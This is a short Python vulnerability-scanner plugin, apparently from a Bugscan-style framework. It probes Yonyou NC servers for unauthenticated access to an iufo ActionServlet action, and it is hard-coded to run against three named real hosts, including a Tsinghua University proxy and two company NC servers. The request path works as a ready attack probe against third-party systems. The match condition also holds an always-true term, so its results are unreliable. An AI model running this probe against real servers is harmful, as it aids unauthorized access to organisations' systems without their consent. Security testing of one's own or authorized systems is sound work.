#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'


def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg


def audit(arg):
    payload = 'service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.release.InfoReleaseAction&method=createBBSRelease&TreeSelectedID=&TableSelectedID='
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'iufo/web/images/usericon.gif' in res and len(res) > 10000 and '/iufo/web/images/tree/tree_plus.gif':
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    
    audit(assign('yongyou_nc', 'http://proxy.tup.tsinghua.edu.cn/')[1])
    audit(assign('yongyou_nc', 'http://nc.bcegc.com/')[1])
    audit(assign('yongyou_nc', 'http://nc.kxtx.cn/')[1])
